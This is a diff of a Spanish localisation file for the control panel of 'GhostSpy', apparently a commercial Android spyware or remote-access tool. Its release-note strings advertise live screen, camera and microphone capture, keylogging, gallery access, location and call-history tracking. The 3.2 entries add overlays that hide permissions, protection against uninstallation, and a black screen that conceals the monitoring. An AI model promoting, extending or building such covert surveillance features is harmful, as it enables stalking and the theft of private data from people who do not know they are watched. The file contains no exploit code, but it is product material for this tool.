@@ -185,35 +185,122 @@
     "continue": "Continuar",
     "description": "Ingrese su dirección de correo electrónico y le ayudaremos a restablecer su contraseña."
   },
+
   "dashboard": {
-    "welcome": "Bienvenida",
+    "welcome": "Bienvenido",
     "installedDevices": "Dispositivos Instalados",
-    "devicesOnline": "Dispositivos en línea",
+    "devicesOnline": "Dispositivos En Línea",
     "newDevices": "Nuevos Dispositivos",
     "systemStatus": "Estado del Sistema",
     "introduce": {
-      "greeting": "¡Hola, bienvenidos al lanzamiento de nuestro más nuevo sistema de monitoreo, el GhostSpy!",
-      "introduce": "Nos gustaría expresar nuestro más sincero agradecimiento por su continuo apoyo y por confiar en nuestros proyectos. Gracias a ustedes, hemos logrado alcanzar este hito significativo, y estamos entusiasmados por presentar GhostSpy, una herramienta poderosa e intuitiva para el monitoreo de dispositivos.",
-      "reason": "Explora todas las posibilidades que ofrece GHOSTSPY:",
-      "feature": {
-        "title": "A continuación, la lista de funcionalidades actuales de GhostSpy:",
-        "screen-monitor": "• <span style='font-weight: 600; color: white;'>Monitorización de Pantalla: </span> Observa en tiempo real lo que se muestra en la pantalla del dispositivo.",
-        "screen-skeleton": "• <span style='font-weight: 600; color: white;'>Monitorización de la Estructura de la Pantalla: </span> Obtén una vista estructurada de las actividades en la pantalla.",
-        "camera-monitor": "• <span style='font-weight: 600; color: white;'>Monitorización de Cámara: </span> Captura y visualiza imágenes de la cámara del dispositivo.",
-        "mic-monitor": "• <span style='font-weight: 600; color: white;'>Monitorización de Micrófono: </span> Escucha lo que se capta por el micrófono del dispositivo.",
-        "key-log": "• <span style='font-weight: 600; color: white;'>Monitorización de Teclas (Key Logs): </span> Registra y analiza todas las teclas presionadas.",
-        "gallery-manager": "• <span style='font-weight: 600; color: white;'>Gestor de Galería: </span> Accede y organiza todas las imágenes y videos almacenados en el dispositivo.",
-        "real-location": "• <span style='font-weight: 600; color: white;'>Monitorización de Ubicación en Tiempo Real: </span> Ve la ubicación exacta del dispositivo en tiempo real.",
-        "call-history": "• <span style='font-weight: 600; color: white;'>Monitorización del Historial de Llamadas: </span> Revisa y sigue todas las llamadas realizadas y recibidas.",
-        "privacy-mode": "• <span style='font-weight: 600; color: white;'>Modo de Privacidad - Pantalla Negra: </span> Activa una pantalla negra en el dispositivo para garantizar la privacidad total durante el monitoreo."
-      },
-      "feedback": "Estamos ansiosos por ver cómo GhostSpy facilitará tus necesidades de monitoreo y gestión. Tu opinión es esencial para nosotros, así que por favor comparte tus experiencias y sugerencias para seguir mejorando GhostSpy.",
-      "thanks": "Una vez más, gracias por acompañarnos en este viaje.",
-      "under": "Atentamente",
-      "supporter": "Go1ano - GhostSpy"
+      "versions": [
+        {
+          "version": "Versión 3.2",
+          "greeting": "¡Bienvenido a la versión 3.2 de GhostSpy!",
+          "introduce": "En esta versión, traemos varias mejoras y nuevas características...",
+          "title": "👻 GhostSpy 3.2 - Novedades:",
+          "features": [
+            {
+              "title": "▪ Aumento de la Capacidad del Servidor",
+              "description": "Hemos actualizado nuestros servidores para ofrecer un control más rápido y fluido, garantizando un rendimiento óptimo para todos los usuarios."
+            },
+            {
+              "title": "▪ Nueva Interfaz de Usuario",
+              "description": "Hemos introducido un diseño renovado para la pantalla de inicio y el proceso de registro, brindando una experiencia más moderna e intuitiva."
+            },
+            {
+              "title": "▪ Mejora en la Ocultación de Permisos",
+              "description": "Agregamos una superposición que oculta automáticamente los permisos y otra que impide la eliminación accidental de la aplicación."
+            },
+            {
+              "title": "▪ Keylogger Offline",
+              "description": "Ahora puedes capturar todos los registros de teclas, incluso sin monitoreo activo, y descargarlos directamente desde el panel en un archivo .txt."
+            },
+            {
+              "title": "▪ Optimización del Keylogger",
+              "description": "Mejoramos el rendimiento y corregimos errores que impedían la captura de algunos datos."
+            },
+            {
+              "title": "▪ Lector de Esqueleto Optimizado",
+              "description": "El lector de esqueleto es ahora más rápido y preciso, mejorando el control general."
+            },
+            {
+              "title": "▪ Optimización Estructural",
+              "description": "Todo el sistema ha sido optimizado para garantizar una experiencia de usuario más fluida y eficiente."
+            },
+            {
+              "title": "▪ Mejoras en el Diseño para Dispositivos Móviles",
+              "description": "El diseño ha sido mejorado para el control en smartphones, tablets e iPads, permitiendo el monitoreo continuo desde estos dispositivos."
+            },
+            {
+              "title": "▪ Mejora del Control de Pantalla",
+              "description": "Hemos cambiado la estructura del código, eliminando una pérdida del 30% en el rendimiento. Ahora el control de pantalla es 40 veces más rápido y fluido."
+            },
+            {
+              "title": "▪ Protección Contra Desinstalación",
+              "description": "Reforzamos la protección contra la eliminación, haciendo que sea imposible desinstalar la aplicación sin autorización."
+            },
+            {
+              "title": "▪ Desinstalación Remota",
+              "description": "Ahora puedes eliminar la aplicación de forma remota a través de la función Eliminar Dispositivo, Borrar Aplicación en el panel de control."
+            }
+          ],
+          "feedback": "Nuestro objetivo es facilitar aún más sus operaciones...",
+          "thanks": "Gracias por confiar en GhostSpy.",
+          "under": "Atentamente",
+          "supporter": "Equipo GhostSpy"
+        },
+        {
+          "version": "Versión 1.0",
+          "greeting": "¡Hola, bienvenidos al lanzamiento de nuestro nuevo sistema de monitoreo, GhostSpy!",
+          "introduce": "Nos gustaría expresar nuestro más sincero agradecimiento por su continuo apoyo y confianza en nuestros proyectos. Gracias a usted pudimos alcanzar este importante hito y estamos entusiasmados de presentar GhostSpy, una herramienta poderosa e intuitiva para monitorear dispositivos.",
+          "title": "Consulta la lista de funciones actuales de GhostSpy a continuación:",
+          "features": [
+            {
+              "title": "▪ Monitoreo de Pantalla",
+              "description": "Siga en tiempo real lo que se muestra en la pantalla del dispositivo."
+            },
+            {
+              "title": "▪ Monitoreo de Esqueleto de Pantalla",
+              "description": "Obtenga una vista estructurada de las actividades en la pantalla."
+            },
+            {
+              "title": "▪ Monitoreo de Cámara",
+              "description": "Capture y visualice imágenes de la cámara del dispositivo."
+            },
+            {
+              "title": "▪ Monitoreo de Micrófono",
+              "description": "Escuche lo que está siendo captado por el micrófono del dispositivo."
+            },
+            {
+              "title": "▪ Monitoreo de Teclas (Key Logs)",
+              "description": "Registre y analice todas las teclas digitadas."
+            },
+            {
+              "title": "▪ Administrador de Galería",
+              "description": "Acceda y organice todas las imágenes y videos almacenados en el dispositivo."
+            },
+            {
+              "title": "▪ Monitoreo de Ubicación en Tiempo Real",
+              "description": "Vea la ubicación exacta del dispositivo en tiempo real."
+            },
+            {
+              "title": "▪ Monitoreo de Historial de Llamadas",
+              "description": "Revise y siga todas las llamadas realizadas y recibidas."
+            },
+            {
+              "title": "▪ Modo Privado - Pantalla Negra",
+              "description": "Active una pantalla negra en el dispositivo para garantizar total privacidad durante el monitoreo."
+            }
+          ],
+          "feedback": "Estamos ansiosos por ver cómo GhostSpy facilitará sus necesidades de monitoreo y gestión. Sus comentarios son esenciales para nosotros, así que por favor, comparta sus experiencias y sugerencias para seguir mejorando GhostSpy.",
+          "thanks": "Una vez más, gracias por estar con nosotros en este viaje.",
+          "under": "Atentamente",
+          "supporter": "Go1ano - GhostSpy"
+        }
+      ]
     }
   },
-
   "devicesPage": {
     "title": "Monitor de Dispositivos",
     "devices": "Dispositivos",
